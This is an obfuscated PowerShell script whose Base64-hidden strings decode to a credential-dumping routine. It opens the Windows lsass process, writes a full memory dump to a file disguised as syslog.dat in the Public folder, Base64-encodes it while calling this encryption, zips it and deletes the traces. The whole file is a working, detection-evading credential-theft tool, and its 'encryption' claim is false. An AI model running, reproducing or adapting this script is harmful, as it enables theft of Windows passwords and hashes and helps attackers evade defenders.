
${_/\/\_/=\_/\/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABzAHkAcwBsAG8AZwAuAGQAYQB0AA==')))
${__/=\/\/\__/===\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABiAGEAYwBrAHUAcAAuAGUAbgBjAA==')))
${_/=\_/\__/\_/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABzAHkAcwBsAG8AZwAuAHoAaQBwAA==')))
${/====\_/=\/=\__/\} = $false
function Wait-ForFile {
    param (
        [string]$filePath,
        [int]$timeoutSeconds = 10
    )
    ${_/\/==========\/=} = 0
    while (!(Test-Path $filePath) -and (${_/\/==========\/=} -lt $timeoutSeconds)) {
        sleep -Seconds 1
        ${_/\/==========\/=}++
    }
    return (Test-Path $filePath)
}
echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAcwB0AGUAYQBsAHQAaAB5ACAATABTAEEAUwBTACAAZAB1AG0AcAAgAHUAcwBpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAGUAZgBsAGUAYwB0AGkAbwBuAC4ALgAuAA==')))
try {
    ${/==\/\/\/\/=\/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAgACAAIAAgAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzADsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABMAFMAQQBTAFMARAB1AG0AcAAgAHsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACgAdQBpAG4AdAAgAHAAcgBvAGMAZQBzAHMAQQBjAGMAZQBzAHMALAAgAGIAbwBvAGwAIABiAEkAbgBoAGUAcgBpAHQASABhAG4AZABsAGUALAAgAGkAbgB0ACAAcAByAG8AYwBlAHMAcwBJAGQAKQA7AA0ACgAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBkAGIAZwBoAGUAbABwAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAATQBpAG4AaQBEAHUAbQBwAFcAcgBpAHQAZQBEAHUAbQBwACgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAaABQAHIAbwBjAGUAcwBzACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBpAG4AdAAgAHAAcgBvAGMAZQBzAHMASQBkACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIABoAEYAaQBsAGUALAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB1AG0AcABUAHkAcABlACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIABlAHgAYwBlAHAAdABpAG8AbgBQAGEAcgBhAG0ALAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAHUAcwBlAHIAUwB0AHIAZQBhAG0AUABhAHIAYQBtACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIABjAGEAbABsAGIAYQBjAGsAUABhAHIAYQBtAA0ACgAgACAAIAAgACAAIAAgACAAKQA7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEMAbABvAHMAZQBIAGEAbgBkAGwAZQAoAEkAbgB0AFAAdAByACAAaABPAGIAagBlAGMAdAApADsADQAKACAAIAAgACAAfQA=')))
    Add-Type -TypeDefinition ${/==\/\/\/\/=\/\__} -Language CSharp
    ${_/=\/\_/=\/\___/\} = 0x0400
    ${_/\_/\/=\_/==\___} = 0x0010
    ${__/\/==\__/=\__/=} = ps -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABzAGEAcwBzAA==')))
    ${_/\/===\_/=\/\/\/} = ${__/\/==\__/=\__/=}.Id
    ${_/=\/=\__/\/\_/==} = [LSASSDump]::OpenProcess(${_/=\/\_/=\/\___/\} -bor ${_/\_/\/=\_/==\___}, $false, ${_/\/===\_/=\/\/\/})
    if (${_/=\/=\__/\/\_/==} -eq 0) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABvAGIAdABhAGkAbgAgAHAAcgBvAGMAZQBzAHMAIABoAGEAbgBkAGwAZQAuACAASQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAHIAaQB2AGkAbABlAGcAZQBzAD8A')))
    }
    ${____/\/==\_/\/\/\} = [System.IO.File]::Open(${_/\/\_/=\_/\/=\/=}, [System.IO.FileMode]::Create)
    ${__/==\_/\_/\/====} = ${____/\/==\_/\/\/\}.SafeFileHandle.DangerousGetHandle()
    ${_/=\/====\/==\/\_} = [LSASSDump]::MiniDumpWriteDump(${_/=\/=\__/\/\_/==}, ${_/\/===\_/=\/\/\/}, ${__/==\_/\_/\/====}, 0x00000002, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if (${_/=\/====\/==\/\_}) {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABMAFMAQQBTAFMAIABkAHUAbQBwACAAYwByAGUAYQB0AGUAZAAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5AC4A')))
        ${/====\_/=\/=\__/\} = $true
    } else {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABMAFMAQQBTAFMAIABkAHUAbQBwACAAZgBhAGkAbABlAGQAIAB1AHMAaQBuAGcAIABzAHQAZQBhAGwAdABoACAAbQBlAHQAaABvAGQALgA=')))
    }
    ${____/\/==\_/\/\/\}.Close()
    [LSASSDump]::CloseHandle(${_/=\/=\__/\/\_/==})
} catch {
    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABJAG4ALQBtAGUAbQBvAHIAeQAgAEwAUwBBAFMAUwAgAGQAdQBtAHAAIABtAGUAdABoAG8AZAAgAGYAYQBpAGwAZQBkADoAIAAkAF8A')))
}
if (${/====\_/=\/=\__/\}) {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAG4AYwByAHkAcAB0AGkAbgBnACAAdABoAGUAIABkAHUAbQBwACAAZgBpAGwAZQAuAC4ALgA=')))
    try {
        ${_/\/=\/\_/=====\/} = [System.IO.File]::ReadAllBytes(${_/\/\_/=\_/\/=\/=})
        ${___/\/\_/=\/\__/=} = [Convert]::ToBase64String(${_/\/=\/\_/=====\/})
        sc -Path ${__/=\/\/\__/===\_} -Value ${___/\/\_/=\/\__/=}
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAHUAbQBwACAAZgBpAGwAZQAgAGUAbgBjAHIAeQBwAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkALgA=')))
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAG8AbQBwAHIAZQBzAHMAaQBuAGcAIAB0AGgAZQAgAGUAbgBjAHIAeQBwAHQAZQBkACAAZAB1AG0AcAAuAC4ALgA=')))
        Compress-Archive -Path ${__/=\/\/\__/===\_} -DestinationPath ${_/=\_/\__/\_/=\/=}
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbQBwAHIAZQBzAHMAaQBvAG4AIABjAG8AbQBwAGwAZQB0AGUAZAA6ACAAJAB7AF8ALwA9AFwAXwAvAFwAXwBfAC8AXABfAC8APQBcAC8APQB9AA==')))
        rd -Path ${_/\/\_/=\_/\/=\/=} -Force -ErrorAction SilentlyContinue
        rd -Path ${__/=\/\/\__/===\_} -Force -ErrorAction SilentlyContinue
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAGwAZQBhAG4AdQBwACAAYwBvAG0AcABsAGUAdABlAGQALgAgAE8AbgBsAHkAIAB0AGgAZQAgAGMAbwBtAHAAcgBlAHMAcwBlAGQAIABhAHIAYwBoAGkAdgBlACAAcgBlAG0AYQBpAG4AcwAuAA==')))
    } catch {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAG4AYwByAHkAcAB0AGkAbwBuACAAbwByACAAYwBvAG0AcAByAGUAcwBzAGkAbwBuACAAZgBhAGkAbABlAGQALgA=')))
    }
} else {
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABMAFMAQQBTAFMAIABkAHUAbQBwACAAZgBhAGkAbABlAGQALgAgAEUAeABpAHQAaQBuAGcAIABzAGMAcgBpAHAAdAAuAA==')))
}
echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABEAG8AbgBlAC4AIABDAGgAZQBjAGsAIAAkAHsAXwAvAD0AXABfAC8AXABfAF8ALwBcAF8ALwA9AFwALwA9AH0AIABmAG8AcgAgAHQAaABlACAAZgBpAG4AYQBsACAAYQByAGMAaABpAHYAZQAgAGkAZgAgAHMAdQBjAGMAZQBzAHMAZgB1AGwALgA=')))